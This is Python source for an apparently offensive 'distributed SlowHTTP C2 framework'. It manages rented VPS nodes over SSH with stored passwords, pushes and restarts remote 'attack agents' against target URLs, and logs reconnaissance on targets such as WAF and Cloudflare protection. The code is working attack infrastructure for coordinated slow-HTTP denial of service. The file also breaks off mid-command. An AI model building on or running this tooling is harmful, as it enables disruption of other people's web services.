#!/usr/bin/env python3

import sqlite3
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
import logging
import hashlib
import re
import ipaddress
import select
import argparse
import urllib.parse
from urllib.parse import urlparse
import ssl
import struct
import queue
import tempfile
import platform
import shutil
import traceback
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
import textwrap


# Try to import optional dependencies
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] cryptography module not found. Password encryption will be limited.")

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("[WARNING] paramiko module not found. SSH functionality will be limited.")

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    print("[WARNING] colorama module not found. Color output will be disabled.")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[WARNING] psutil module not found. System monitoring will be limited.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[WARNING] requests module not found. Some network features will be limited.")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[WARNING] dnspython module not found. DNS features will be limited.")

# Ensure logs directory exists
os.makedirs("logs", exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"logs/slowhttp_c2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SlowHTTP-C2")

# Version information
VERSION = "5.0"
BUILD_DATE = "2025-01-04"
AUTHOR = "NinjaTech Security Team"
DESCRIPTION = "Advanced Distributed SlowHTTP C2 Framework"

class Colors:
    """ANSI color codes for terminal output"""
    if COLOR_AVAILABLE:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        PURPLE = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
    else:
        RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = DIM = RESET = ""


def generate_session_id():
    """Generate unique session ID for attack processes"""
    import random
    import string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

class SecurityManager:
    """Handles security operations like encryption and validation"""
    
    def __init__(self):
        """Initialize security manager with encryption key"""
        self.key_file = 'key.key'
        
        if CRYPTO_AVAILABLE:
            if os.path.exists(self.key_file):
                try:
                    with open(self.key_file, 'rb') as f:
                        self.key = f.read()
                except Exception as e:
                    logger.error(f"Failed to read key file: {str(e)}")
                    self._generate_new_key()
            else:
                self._generate_new_key()
                
            try:
                self.cipher = Fernet(self.key)
            except Exception as e:
                logger.error(f"Failed to initialize cipher: {str(e)}")
                self.cipher = None
        else:
            self.key = None
            self.cipher = None
            logger.warning("Cryptography module not available. Using fallback encryption.")
    
    def _generate_new_key(self):
        """Generate a new encryption key"""
        try:
            self.key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(self.key_file, 0o600)  # Secure permissions
            logger.info("Generated new encryption key")
        except Exception as e:
            logger.error(f"Failed to generate new key: {str(e)}")
            self.key = None
    
    def encrypt_password(self, password):
        """Encrypt password with proper error handling"""
        if not password:
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
            else:
                # Fallback encryption (not secure, but better than plaintext)
                salt = os.urandom(16)
                key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
                return base64.b64encode(salt + key).decode()
        except Exception as e:
            logger.error(f"Encryption error: {str(e)}")
            # Return a special marker for encryption failure
            return f"ENCRYPTION_FAILED_{int(time.time())}"
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password with comprehensive error handling"""
        if not encrypted_password:
            return ""
            
        if encrypted_password.startswith("ENCRYPTION_FAILED_"):
            logger.error("Attempted to decrypt a failed encryption marker")
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
            else:
                # This is just a placeholder - in reality, you can't decrypt the fallback method
                # It would need to be replaced with a proper implementation
                logger.warning("Attempted to decrypt with fallback method, which is not fully reversible")
                return encrypted_password
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            return ""
    
    def validate_ip(self, ip):
        """Validate IP address format"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def sanitize_input(self, input_str, max_length=None):
        """Sanitize user input to prevent command injection"""
        if not input_str:
            return ""
        
        # Convert to string
        sanitized = str(input_str)
        
        # Remove dangerous characters and command injection patterns
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '<', '>', '(', ')', '{', '}', '[', ']']
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Remove command substitution patterns
        sanitized = re.sub(r'\$\([^)]*\)', '', sanitized)  # Remove $(...)
        sanitized = re.sub(r'`[^`]*`', '', sanitized)         # Remove `...`
        
        # Remove multiple spaces
        sanitized = re.sub(r'\s+', ' ', sanitized)
        
        # Strip leading/trailing whitespace
        sanitized = sanitized.strip()
        
        # Limit length if specified
        if max_length and len(sanitized) > max_length:
            sanitized = sanitized[:max_length]
            
        return sanitized

class DatabaseManager:
    """Manages database operations for the C2 server"""
    
    def __init__(self, db_file='c2_database.db'):
        """Initialize database manager with specified database file"""
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Initialize database schema with all required tables"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # VPS nodes table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps_nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL UNIQUE,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ssh_port INTEGER DEFAULT 22,
                    status TEXT DEFAULT 'offline',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP,
                    location TEXT,
                    tags TEXT,
                    system_info TEXT
                )
            ''')
            
            # Attack sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_name TEXT NOT NULL,
                    target_url TEXT NOT NULL,
                    target_host TEXT,
                    attack_type TEXT NOT NULL,
                    vps_nodes TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT DEFAULT 'pending',
                    parameters TEXT,
                    results TEXT,
                    notes TEXT,
                    target_info TEXT
                )
            ''')
            
            # Attack results table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    vps_ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connections_active INTEGER DEFAULT 0,
                    packets_sent INTEGER DEFAULT 0,
                    bytes_sent INTEGER DEFAULT 0,
                    error_count INTEGER DEFAULT 0,
                    cpu_usage REAL,
                    memory_usage REAL,
                    response_codes TEXT,
                    status TEXT,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
                )
            ''')
            
            # Target information table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL UNIQUE,
                    ip_addresses TEXT,
                    web_server TEXT,
                    waf_detected BOOLEAN DEFAULT 0,
                    waf_type TEXT,
                    cloudflare_protected BOOLEAN DEFAULT 0,
                    open_ports TEXT,
                    dns_records TEXT,
                    ssl_info TEXT,
                    whois_info TEXT,
                    last_scan TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    notes TEXT
                )
            ''')
            
            conn.commit()
            logger.info("Database initialized successfully")
        except sqlite3.Error as e:
            logger.error(f"Database initialization error: {str(e)}")
        finally:
            if conn:
                conn.close()
            self.migrate_database()
    
    def add_vps(self, ip_address, username, encrypted_password, ssh_port=22, location=None, tags=None):
        """Add a new VPS node to the database"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Check if VPS already exists
            cursor.execute("SELECT id FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            if cursor.fetchone():
                return None, "VPS with this IP address already exists"
            
            # Prepare tags as JSON
            tags_json = json.dumps(tags) if tags else None
            
            # Insert new VPS
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, tags)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip_address, username, encrypted_password, ssh_port, location, tags_json))
            
            conn.commit()
            vps_id = cursor.lastrowid
            logger.info(f"Added new VPS: {ip_address}")
            return vps_id, "VPS added successfully"
        except sqlite3.Error as e:
            logger.error(f"Error adding VPS: {str(e)}")
            return None, f"Database error: {str(e)}"
        finally:
            if conn:
                conn.close()
    
    def get_vps(self, ip_address):
        """Get VPS details by IP address"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            vps = cursor.fetchone()
            
            if vps:
                return dict(vps)
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting VPS: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_all_vps(self):
        """Get all VPS nodes"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM vps_nodes ORDER BY id")
            vps_list = [dict(row) for row in cursor.fetchall()]
            
            return vps_list
        except sqlite3.Error as e:
            logger.error(f"Error getting all VPS: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def update_vps_status(self, ip_address, status, message=None):
        """Update VPS status and last_seen timestamp"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Update status and last_seen
            cursor.execute('''
                UPDATE vps_nodes 
                SET status = ?, last_seen = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (status, ip_address))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating VPS status: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def update_vps_system_info(self, ip_address, system_info):
        """Update VPS system information"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert system_info dict to JSON
            system_info_json = json.dumps(system_info)
            
            # Update system_info
            cursor.execute('''
                UPDATE vps_nodes 
                SET system_info = ?
                WHERE ip_address = ?
            ''', (system_info_json, ip_address))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating VPS system info: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def remove_vps(self, ip_address):
        """Remove a VPS node from the database"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Delete VPS
            cursor.execute("DELETE FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error removing VPS: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def create_attack_session(self, session_name, target_url, attack_type, vps_nodes, parameters):
        """Create a new attack session"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Parse target URL to get host
            parsed = urlparse(target_url)
            target_host = parsed.netloc or parsed.path.split('/')[0]
            
            # Convert parameters dict to JSON
            parameters_json = json.dumps(parameters)
            
            # Convert VPS nodes list to comma-separated string
            vps_nodes_str = ','.join(vps_nodes)
            
            # Insert new attack session
            cursor.execute('''
                INSERT INTO attack_sessions 
                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, status, start_time)
                VALUES (?, ?, ?, ?, ?, ?, 'running', CURRENT_TIMESTAMP)
            ''', (session_name, target_url, target_host, attack_type, vps_nodes_str, parameters_json))
            
            conn.commit()
            session_id = cursor.lastrowid
            logger.info(f"Created attack session: {session_name} (ID: {session_id})")
            return session_id
        except sqlite3.Error as e:
            logger.error(f"Error creating attack session: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def update_attack_status(self, session_id, status, results=None):
        """Update attack session status"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            if status == 'completed' or status == 'failed':
                # Set end time if attack is completed or failed
                cursor.execute('''
                    UPDATE attack_sessions 
                    SET status = ?, end_time = CURRENT_TIMESTAMP, results = ?
                    WHERE id = ?
                ''', (status, results, session_id))
            else:
                # Just update status
                cursor.execute('''
                    UPDATE attack_sessions 
                    SET status = ?
                    WHERE id = ?
                ''', (status, session_id))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating attack status: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def add_attack_result(self, session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status):
        """Add attack result data"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert response_codes dict to JSON
            response_codes_json = json.dumps(response_codes) if response_codes else None
            
            # Insert attack result
            cursor.execute('''
                INSERT INTO attack_results 
                (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes_json, status))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error adding attack result: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def migrate_database(self):
        """Tambahkan kolom yang hilang"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Cek kolom bytes_sent
            cursor.execute("PRAGMA table_info(attack_results)")
            columns = [col[1] for col in cursor.fetchall()]
            
            if 'bytes_sent' not in columns:
                cursor.execute("ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0")
                conn.commit()
                logger.info("Added missing 'bytes_sent' column")
                
        except sqlite3.Error as e:
            logger.error(f"Migration error: {str(e)}")
        finally:
            if conn:
                conn.close()


    def get_attack_session(self, session_id):
        """Get attack session details by ID"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM attack_sessions WHERE id = ?", (session_id,))
            session = cursor.fetchone()
            
            if session:
                return dict(session)
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting attack session: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_attack_sessions(self, limit=None):
        """Get all attack sessions with optional limit"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if limit:
                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC LIMIT ?", (limit,))
            else:
                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC")
                
            sessions = [dict(row) for row in cursor.fetchall()]
            
            return sessions
        except sqlite3.Error as e:
            logger.error(f"Error getting attack sessions: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def get_active_attack_sessions(self):
        """Get all active attack sessions"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM attack_sessions WHERE status = 'running' ORDER BY id DESC")
            sessions = [dict(row) for row in cursor.fetchall()]
            
            return sessions
        except sqlite3.Error as e:
            logger.error(f"Error getting active attack sessions: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def get_attack_results(self, session_id, limit=None):
        """Get attack results for a session with optional limit"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if limit:
                cursor.execute('''
                    SELECT * FROM attack_results 
                    WHERE session_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (session_id, limit))
            else:
                cursor.execute('''
                    SELECT * FROM attack_results 
                    WHERE session_id = ? 
                    ORDER BY timestamp DESC
                ''', (session_id,))
                
            results = [dict(row) for row in cursor.fetchall()]
            
            return results
        except sqlite3.Error as e:
            logger.error(f"Error getting attack results: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def add_target_info(self, domain, ip_addresses=None, web_server=None, waf_detected=False, waf_type=None, cloudflare_protected=False, open_ports=None, dns_records=None, ssl_info=None, whois_info=None, notes=None):
        """Add or update target information"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert data to JSON
            ip_addresses_json = json.dumps(ip_addresses) if ip_addresses else None
            open_ports_json = json.dumps(open_ports) if open_ports else None
            dns_records_json = json.dumps(dns_records) if dns_records else None
            ssl_info_json = json.dumps(ssl_info) if ssl_info else None
            whois_info_json = json.dumps(whois_info) if whois_info else None
            
            # Check if target already exists
            cursor.execute("SELECT id FROM targets WHERE domain = ?", (domain,))
            existing = cursor.fetchone()
            
            if existing:
                # Update existing target
                cursor.execute('''
                    UPDATE targets 
                    SET ip_addresses = ?, web_server = ?, waf_detected = ?, waf_type = ?,
                        cloudflare_protected = ?, open_ports = ?, dns_records = ?,
                        ssl_info = ?, whois_info = ?, last_scan = CURRENT_TIMESTAMP,
                        notes = ?
                    WHERE domain = ?
                ''', (ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes, domain))
                
                target_id = existing[0]
                logger.info(f"Updated target information: {domain}")
            else:
                # Insert new target
                cursor.execute('''
                    INSERT INTO targets 
                    (domain, ip_addresses, web_server, waf_detected, waf_type, cloudflare_protected, open_ports, dns_records, ssl_info, whois_info, notes)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (domain, ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes))
                
                target_id = cursor.lastrowid
                logger.info(f"Added new target: {domain}")
            
            conn.commit()
            return target_id
        except sqlite3.Error as e:
            logger.error(f"Error adding target info: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_target_info(self, domain):
        """Get target information by domain"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM targets WHERE domain = ?", (domain,))
            target = cursor.fetchone()
            
            if target:
                target_dict = dict(target)
                
                # Parse JSON fields
                for field in ['ip_addresses', 'open_ports', 'dns_records', 'ssl_info', 'whois_info']:
                    if target_dict.get(field):
                        try:
                            target_dict[field] = json.loads(target_dict[field])
                        except:
                            target_dict[field] = None
                
                return target_dict
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting target info: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def close(self):
        """Close any open database connections"""
        # SQLite connections are opened and closed for each operation
        # This method is included for consistency with other managers
        pass

class SSHManager:
    """Manages SSH connections to VPS nodes"""
    
    def __init__(self, security_manager):
        """Initialize SSH manager with security manager for password handling"""
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
        self.cache_lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=25):
        """Connect to a VPS with comprehensive error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
            
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            # Cache credentials for auto-reconnect
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port,
                'target': '',
                'attack_type': '',
                'session_id': '',
                'last_updated': time.time()
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect with timeout
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout
            )
            
            self.connections[ip] = ssh
            return True, "Connected successfully"
            
        except paramiko.AuthenticationException:
            return False, "Authentication failed - check username and password"
        except paramiko.SSHException as e:
            return False, f"SSH error: {str(e)}"
        except socket.timeout:
            return False, "Connection timed out"
        except socket.error as e:
            return False, f"Socket error: {str(e)}"
        except Exception as e:
            error_msg = str(e).lower()
            if "timed out" in error_msg:
                return False, f"Connection timed out - VPS may be slow or overloaded"
            elif "refused" in error_msg:
                return False, f"Connection refused - check if SSH service is running on port {port}"
            elif "unreachable" in error_msg:
                return False, f"Network unreachable - check VPS IP address and network"
            elif "authentication" in error_msg:
                return False, f"Authentication failed - check username and password"
            else:
                return False, f"Connection error: {str(e)}"
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        """Disconnect from a VPS"""
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                return True
            except Exception as e:
                logger.error(f"Error disconnecting from {ip}: {str(e)}")
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True, max_retries=3):
        """Execute command with enhanced error handling and recovery"""
        
        retries = 0
        last_error = None
        
        while retries < max_retries:
            # Check if connection exists
            if ip not in self.connections:
                if auto_reconnect:
                    logger.info(f"No connection to {ip}, attempting reconnect...")
                    success, message = self.reconnect_vps(ip)
                    if not success:
                        last_error = f"Reconnection failed: {message}"
                        retries += 1
                        time.sleep(2 ** retries)  # Exponential backoff
                        continue
                else:
                    return False, "No connection to VPS"
            
            try:
                # Test connection first
                transport = self.connections[ip].get_transport()
                if not transport or not transport.is_active():
                    logger.warning(f"Connection to {ip} is not active, reconnecting...")
                    if ip in self.connections:
                        del self.connections[ip]
                    if auto_reconnect:
                        success, message = self.reconnect_vps(ip)
                        if not success:
                            return False, f"Reconnection failed: {message}"
                    else:
                        return False, "Connection not active"
                
                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
                exit_status = stdout.channel.recv_exit_status()
                output = stdout.read().decode('utf-8', errors='replace')
                error = stderr.read().decode('utf-8', errors='replace')
                
                # Handle specific error cases
                if exit_status != 0:
                    # Check for database-related errors
                    if "no column named bytes_sent" in error or "table attack_results has no column" in error:
                        logger.error(f"Database schema error on {ip}: {error}")
                        logger.info("Attempting to fix database schema...")
                        
                        # Try to fix database schema
                        if self._fix_database_schema(ip):
                            logger.info("Database schema fixed, retrying command...")
                            retries += 1
                            continue
                        else:
                            logger.error("Failed to fix database schema")
                    
                    # Log detailed error
                    logger.error(f"Command failed on {ip}:")
                    logger.error(f"Command: {command[:100]}...")  # Log partial command
                    logger.error(f"Exit status: {exit_status}")
                    logger.error(f"Error: {error}")
                    
                    # Try to restart attack if it's an attack command
                    if "attack" in command.lower() and auto_reconnect:
                        logger.info(f"Attempting to restart attack on {ip}")
                        if self.restart_attack(ip):
                            logger.info("Attack restarted successfully")
                            retries += 1
                            continue
                    
                    last_error = error or "Command failed with no error message"
                    retries += 1
                    time.sleep(2 ** retries)
                    continue
                
                return True, output
                
            except socket.timeout:
                logger.error(f"Command timed out on {ip}")
                last_error = "Command timed out"
                retries += 1
                time.sleep(2 ** retries)
                
            except paramiko.SSHException as e:
                logger.error(f"SSH error on {ip}: {str(e)}")
                
                # Try to reconnect if connection was lost
                if auto_reconnect:
                    logger.info(f"Attempting to reconnect to {ip}...")
                    success, message = self.reconnect_vps(ip)
                    if success:
                        logger.info(f"Reconnected to {ip}, retrying command...")
                        retries += 1
                        continue
                    else:
                        last_error = f"Reconnection failed: {message}"
                
                retries += 1
                time.sleep(2 ** retries)
                
            except Exception as e:
                logger.error(f"Unexpected error executing command on {ip}: {str(e)}")
                last_error = str(e)
                retries += 1
                time.sleep(2 ** retries)
        
        return False, f"Command failed after {max_retries} retries. Last error: {last_error}"
    

    def restart_attack(self, ip):
        """Restart attack process on VPS"""
        try:
            # Kill existing attack process
            # Get session ID from cache if available
            session_id = self.connection_cache.get(ip, {}).get('session_id', '')
            if session_id:
                kill_cmd = f"pkill -f 'python3 agent.py.*{session_id}'"
            else:
                kill_cmd = "pkill -f 'python3 agent.py'"
            success, output = self.execute_command(ip, kill_cmd, auto_reconnect=False)
            
            # Start new attack process
            if ip in self.connection_cache:
                cached = self.connection_cache[ip]
                attack_cmd = f"cd ~/slowhttp_agent && nohup python3 agent.py --target {cached.get('target', '')} --port {cached.get('port', 80)} > /dev/null 2>&1 &"
                success, output = self.execute_command(ip, attack_cmd, auto_reconnect=False)
                
                if success:
                    logger.info(f"Successfully restarted attack on {ip}")
                    return True
                else:
                    logger.error(f"Failed to restart attack on {ip}: {output}")
                    return False
            else:
                logger.error(f"No cached data for {ip}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to restart attack on {ip}: {str(e)}")
            return False
    
    def _fix_database_schema(self, ip):
        """Attempt to fix database schema on VPS"""
        try:
            # Check if database file exists
            check_db_cmd = "test -f c2_database.db && echo 'exists' || echo 'missing'"
            success, output = self.execute_command(ip, check_db_cmd, auto_reconnect=False)
            if not success or "missing" in output:
                logger.warning("Database file not found on VPS")
                return False
            
            # Get database schema
            schema_cmd = "sqlite3 c2_database.db \"PRAGMA table_info(attack_results)\""
            success, output = self.execute_command(ip, schema_cmd, auto_reconnect=False)
            if not success:
                logger.error("Failed to get database schema")
                return False
            
            # Check if bytes_sent column exists
            if "bytes_sent" not in output:
                # Add missing column
                alter_cmd = "sqlite3 c2_database.db \"ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0\""
                success, output = self.execute_command(ip, alter_cmd, auto_reconnect=False)
                if success:
                    logger.info("Successfully added bytes_sent column to database")
                    return True
                else:
                    logger.error("Failed to add bytes_sent column")
                    return False
            else:
                logger.info("Database schema already up to date")
                return True
                
        except Exception as e:
            logger.error(f"Error fixing database schema: {str(e)}")
            return False
    
    def deploy_agent(self, ip, agent_type="standard"):
        """Deploy attack agent to VPS"""
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            # Check if Python3 is available first
            python_success, python_output = self.execute_command(ip, "python3 --version", timeout=20)
            if not python_success:
                return False, f"Python3 not available: {python_output}"
            
            # Create directory for agent
            mkdir_cmd = "mkdir -p ~/slowhttp_agent"
            success, output = self.execute_command(ip, mkdir_cmd, timeout=25)
            if not success:
                return False, f"Failed to create agent directory: {output}"
            
            # Test write permissions
            test_cmd = "touch ~/slowhttp_agent/test.txt && rm ~/slowhttp_agent/test.txt"
            perm_success, perm_output = self.execute_command(ip, test_cmd, timeout=20)
            if not perm_success:
                return False, f"No write permissions in agent directory: {perm_output}"
            
            # Get appropriate agent script
            if agent_type == "advanced":
                agent_script = self._get_advanced_agent_script()
            else:
                agent_script = self._get_standard_agent_script()
            
            # Write script to file
            write_cmd = f"cat > ~/slowhttp_agent/agent.py << 'EOL'\n{agent_script}\nEOL"
            success, output = self.execute_command(ip, write_cmd)
            if not success:
                return False, f"Failed to write agent script: {output}"
            
            # Make script executable
            chmod_cmd = "chmod +x ~/slowhttp_agent/agent.py"
            success, output = self.execute_command(ip, chmod_cmd)
            if not success:
                return False, f"Failed to make agent executable: {output}"
            
            # Test agent
            test_cmd = "cd ~/slowhttp_agent && python3 agent.py --version"
            success, output = self.execute_command(ip, test_cmd)
            if not success:
                return False, f"Agent test failed: {output}"
            
            logger.info(f"Successfully deployed {agent_type} agent to {ip}")
            return True, "Agent deployed successfully"
        except Exception as e:
            logger.error(f"Error deploying agent to {ip}: {str(e)}")
            return False, str(e)
    
    def get_system_info(self, ip):
        if ip not in self.connections:
            return None
        try:
            cmd = textwrap.dedent("""\
            /usr/bin/env bash -s <<'BASH'
            set -e
            export LC_ALL=C.UTF-8 LANG=C.UTF-8
            
            hostname_val=$(hostname)
            os_val=$(awk -F= '/^PRETTY_NAME=/{print $2}' /etc/os-release | tr -d '"')
            kernel_val=$(uname -r)
            cpu_val=$(awk -F: '/model name|Processor/ {print $2; exit}' /proc/cpuinfo | sed 's/^ *//')
            cpu_cores_val=$(grep -c '^processor' /proc/cpuinfo || nproc)
            mem_total_val=$(awk '/MemTotal:/ {printf "%.0f MiB", $2/1024}' /proc/meminfo)
            mem_used_val=$(free -m | awk '/Mem:/ {printf "%d MiB", $3}')
            disk_total_val=$(df -h / | awk 'NR==2{print $2}')
            disk_used_val=$(df -h / | awk 'NR==2{print $3}')
            python_ver_val=$(python3 --version 2>&1 || true)
            uptime_val=$(uptime -p)
            
            printf '{'
            printf '"hostname":"%s",' "$hostname_val"
            printf '"os":"%s",' "$os_val"
            printf '"kernel":"%s",' "$kernel_val"
            printf '"cpu":"%s",' "$cpu_val"
            printf '"cpu_cores":%s,' "$cpu_cores_val"
